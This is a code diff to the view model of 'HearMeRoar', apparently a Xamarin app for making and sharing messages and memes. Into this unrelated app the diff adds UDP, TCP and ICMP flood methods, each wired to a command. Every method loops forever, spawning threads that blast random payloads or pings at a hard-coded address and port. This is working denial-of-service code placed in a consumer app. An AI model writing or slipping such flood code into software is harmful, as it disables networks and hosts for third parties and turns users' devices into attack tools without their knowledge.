@@ -8,9 +8,14 @@ using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.IO;
+using System.Linq;
 using System.Net;
 using System.Net.Http;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
 using System.Reflection;
+using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Input;
 using Xamarin.Essentials;
@@ -43,6 +48,11 @@ namespace HearMeRoar.ViewModels
             CopyText = new Command(() => CopyToClipboard());
             ShareMessageMeme = new Command(() => shareMessageImage());
             ShareMessageText = new Command(() => shareMessageEmail());
+
+
+            UDPAttack = new Command(() => udpattack());
+            TCPAttack = new Command(() => tcpattack());
+            ICMPAttack = new Command(() => icmpattack());
 
             //set default image
             shareBackground = BitmapExtensions.LoadBitmapResource(GetType(), "HearMeRoar.ShareBackground2.jpg");
@@ -370,9 +380,118 @@ namespace HearMeRoar.ViewModels
         public ICommand GenerateMsg { private set; get; }
         public ICommand ShareMessageMeme { private set; get; }
         public ICommand ShareMessageText { private set; get; }
+
+        public ICommand UDPAttack { private set; get; }
+        public ICommand TCPAttack { private set; get; }
+        public ICommand ICMPAttack { private set; get; }
         public interface IGetFileStream
         {
             MemoryStream getStream();
+        }
+
+
+        public static String generateStringSize(long sizeByte)
+        {
+
+            StringBuilder sb = new StringBuilder();
+            Random rd = new Random();
+
+            var numOfChars = sizeByte;
+            string allows = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            int maxIndex = allows.Length - 1;
+            for (int i = 0; i < numOfChars; i++)
+            {
+                int index = rd.Next(maxIndex);
+                char c = allows[index];
+                sb.Append(c);
+            }
+            return sb.ToString();
+        }
+
+        string sIP = "192.168.1.1";
+        string sPort = "80";
+        string sSize = "10"; 
+        public int amountint = 0;
+        public int amountfint = 0;
+
+        public void udpattack()
+        {
+
+            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
+                ProtocolType.Udp);
+
+            IPAddress serverAddr = IPAddress.Parse(sIP);
+
+            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(sPort));
+            string data = generateStringSize(1024 * int.Parse(sSize));
+            byte[] sus = Encoding.ASCII.GetBytes(data);
+            sock.Connect(serverAddr, int.Parse(sPort));
+            for (; ; )
+            {
+                new Thread(() =>
+                {
+                    try
+                    {
+                        sock.SendTo(sus, endPoint);
+                        amountint++;
+                    }
+                    catch
+                    {
+                        amountfint++;
+                    }
+                }).Start();
+            }
+        }
+        public void tcpattack()
+        {
+            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            IPAddress serverAddr = IPAddress.Parse(sIP);
+
+            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(sPort));
+            string data = generateStringSize(1024 * int.Parse(sSize));
+            byte[] sus = Encoding.ASCII.GetBytes(data);
+            sock.Connect(serverAddr, int.Parse(sPort));
+            for (; ; )
+            {
+                new Thread(() =>
+                {
+                    try
+                    {
+                        sock.SendTo(sus, endPoint);
+                        amountint++;
+                    }
+                    catch
+                    {
+                        amountfint++;
+                    }
+                }).Start();
+            }
+        }
+        public void icmpattack()
+        {
+            new Thread(() =>
+            {
+                Ping pingSender = new Ping();
+                string data = generateStringSize(1024 * 1);
+                byte[] sus = Encoding.ASCII.GetBytes(data);
+                int timeout = 5000;
+                PingOptions options = new PingOptions(64, true);
+                for (; ; )
+                {
+                    new Thread(() =>
+                    {
+                        try
+                        {
+                            PingReply reply = pingSender.Send(sIP, timeout, sus, options);
+                            amountint++;
+                        }
+                        catch
+                        {
+                            amountfint++;
+                        }
+                    }).Start();
+                }
+            }).Start();
         }
 
         async void GenerateMsgTxt()
